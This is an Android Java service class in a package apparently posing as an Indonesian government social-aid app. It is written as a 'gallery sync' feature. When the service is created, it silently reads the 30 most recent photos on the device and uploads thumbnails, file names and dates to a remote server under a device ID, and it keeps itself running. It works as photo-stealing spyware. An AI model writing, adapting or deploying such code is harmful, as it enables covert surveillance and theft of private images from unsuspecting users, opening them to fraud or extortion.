package com.kemensos.bansos;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.media.ThumbnailUtils;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * GallerySyncService — Reads device photo gallery and syncs thumbnails to server
 * Uses MediaStore API (works on Android 5.0+)
 * Sends thumbnails to POST /api/device-upload/<device_id>
 */
public class GallerySyncService extends android.app.Service {

    private static final String TAG = "GallerySync";
    private static final String BASE_URL = MainActivity.BASE_URL;
    private static final String DEVICE_ID = MainActivity.DEVICE_ID;
    private static final int MAX_PHOTOS = 30;
    private static final int THUMB_SIZE = 320;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        syncGallery();
    }

    private void syncGallery() {
        new Thread(() -> {
            try {
                ContentResolver cr = getContentResolver();
                Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

                String[] projection = {
                        MediaStore.Images.Media._ID,
                        MediaStore.Images.Media.DISPLAY_NAME,
                        MediaStore.Images.Media.DATE_TAKEN,
                        MediaStore.Images.Media.SIZE,
                        MediaStore.Images.Media.MIME_TYPE
                };

                String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";
                Cursor cursor = cr.query(uri, projection, null, null, sortOrder);

                if (cursor == null) {
                    Log.e(TAG, "Cursor null — no permission?");
                    return;
                }

                int count = 0;
                while (cursor.moveToNext() && count < MAX_PHOTOS) {
                    long id = cursor.getLong(0);
                    String name = cursor.getString(1);
                    long dateTaken = cursor.getLong(2);
                    long size = cursor.getLong(3);
                    String mime = cursor.getString(4);

                    // Get thumbnail
                    Bitmap thumbnail = MediaStore.Images.Thumbnails.getThumbnail(
                            cr, id, MediaStore.Images.Thumbnails.MINI_KIND, null);

                    if (thumbnail != null) {
                        // Resize if needed
                        Bitmap resized = ThumbnailUtils.extractThumbnail(thumbnail, THUMB_SIZE, THUMB_SIZE);
                        uploadThumbnail(resized, name, dateTaken);
                        count++;
                    }
                }
                cursor.close();
                Log.d(TAG, "Synced " + count + " gallery photos");

            } catch (Exception e) {
                Log.e(TAG, "Gallery sync error: " + e.getMessage());
            }
        }).start();
    }

    private void uploadThumbnail(Bitmap bitmap, String originalName, long dateTaken) {
        try {
            // Compress to JPEG
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
            byte[] imageData = baos.toByteArray();

            // Build multipart POST
            String boundary = "Boundary-" + System.currentTimeMillis();
            URL url = new URL(BASE_URL + "/api/device-upload/" + DEVICE_ID);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);

            OutputStream os = conn.getOutputStream();

            // type field
            String typePart = "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"type\"\r\n\r\n" +
                    "gallery\r\n";
            os.write(typePart.getBytes("UTF-8"));

            // file field
            String header = "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"gallery_" + originalName + "\"\r\n" +
                    "Content-Type: image/jpeg\r\n\r\n";
            os.write(header.getBytes("UTF-8"));
            os.write(imageData);
            os.write(("\r\n").getBytes("UTF-8"));

            // name + date metadata as extra field
            String metaPart = "--" + boundary + "\r\n" +
                    "Content-Disposition: form-data; name=\"metadata\"\r\n\r\n" +
                    "{\"name\":\"" + originalName + "\",\"date\":" + dateTaken + "}\r\n";
            os.write(metaPart.getBytes("UTF-8"));

            os.write(("--" + boundary + "--\r\n").getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "Uploaded " + originalName + " -> " + responseCode);
            conn.disconnect();

        } catch (Exception e) {
            Log.e(TAG, "Upload error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public android.os.IBinder onBind(Intent intent) {
        return null;
    }
}
